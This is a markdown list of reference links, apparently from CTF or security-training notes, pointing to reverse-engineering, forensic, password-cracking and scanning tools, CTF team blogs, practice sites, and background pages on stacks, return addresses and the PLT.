[Hexcellents CTF Knowledge Base]: http://security.cs.pub.ro/hexcellents/wiki/home
[GDB]: https://www.gnu.org/software/gdb/
[The Linux System Administrator's Guide]: http://www.tldp.org/LDP/sag/html/index.html
[aeskeyfind]: https://citp.princeton.edu/research/memory/code/
[rsakeyfind]: https://citp.princeton.edu/research/memory/code/
[Easy Python Decompiler]: http://sourceforge.net/projects/easypythondecompiler/
[factordb.com]: http://factordb.com/
[Volatility]: https://github.com/volatilityfoundation/volatility
[Autopsy]: http://www.sleuthkit.org/autopsy/
[ShowMyCode]: http://www.showmycode.com/
[HTTrack]: https://www.httrack.com/
[theHarvester]: https://github.com/laramies/theHarvester
[Netcraft]: http://toolbar.netcraft.com/site_report/
[Nikto]: https://cirt.net/Nikto2
[PIVOT Project]: http://pivotproject.org/
[InsomniHack PDF]: http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf
[radare]: http://www.radare.org/r/
[radare2]: http://www.radare.org/r/
[foremost]: https://en.wikipedia.org/wiki/Foremost_%28software%29
[ZAP]: https://github.com/zaproxy/zaproxy
[Computer Security Student]: https://www.computersecuritystudent.com/HOME/index.html
[Vulnerable Web Page]: http://testphp.vulnweb.com/
[Hipshot]: https://bitbucket.org/eliteraspberries/hipshot
[John the Ripper]: https://en.wikipedia.org/wiki/John_the_Ripper
[hashcat]: http://hashcat.net/oclhashcat/
[fcrackzip]: http://manpages.ubuntu.com/manpages/hardy/man1/fcrackzip.1.html
[Whitehatters Academy]: https://www.whitehatters.academy/
[gn00bz]: http://gnoobz.com/
[Command Line Kung Fu]:http://blog.commandlinekungfu.com/
[Cybrary]: https://www.cybrary.it/
[Obum Chidi]: https://obumchidi.wordpress.com/
[ksnctf]: http://ksnctf.sweetduet.info/
[ToolsWatch]: http://www.toolswatch.org/category/tools/
[Net Force]:https://net-force.nl/
[Nandy Narwhals]: http://nandynarwhals.org/
[CTFHacker]: http://ctfhacker.com/
[Tasteless]: http://tasteless.eu/
[Dragon Sector]: http://blog.dragonsector.pl/
[pwnable.kr]: http://pwnable.kr/
[reversing.kr]: http://reversing.kr/
[DVWA]: http://www.dvwa.co.uk/
[Damn Vulnerable Web App]: http://www.dvwa.co.uk/
[b01lers]: https://b01lers.net/
[Capture the Swag]: https://ctf.rip/
[pointer]: https://en.wikipedia.org/wiki/Pointer_%28computer_programming%29
[call stack]: https://en.wikipedia.org/wiki/Call_stack
[return statement]: https://en.wikipedia.org/wiki/Return_statement
[return address]: https://en.wikipedia.org/wiki/Return_statement
[disassemble]: https://en.wikipedia.org/wiki/Disassembler
[less]: https://en.wikipedia.org/wiki/Less_%28Unix%29
[puts]: http://pubs.opengroup.org/onlinepubs/009695399/functions/puts.html
[disassembly]: https://en.wikibooks.org/wiki/X86_Disassembly
[PLT]: https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html
[Procedure Lookup Table]: http://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got
[environment variable]: https://en.wikipedia.org/wiki/Environment_variable
[getenvaddr]: https://code.google.com/p/protostar-solutions/source/browse/Stack+6/getenvaddr.c?r=3d0a6873d44901d63caf9ad3764cfb9ab47f3332
[getenvaddr.c]: https://code.google.com/p/protostar-solutions/source/browse/Stack+6/getenvaddr.c?r=3d0a6873d44901d63caf9ad3764cfb9ab47f3332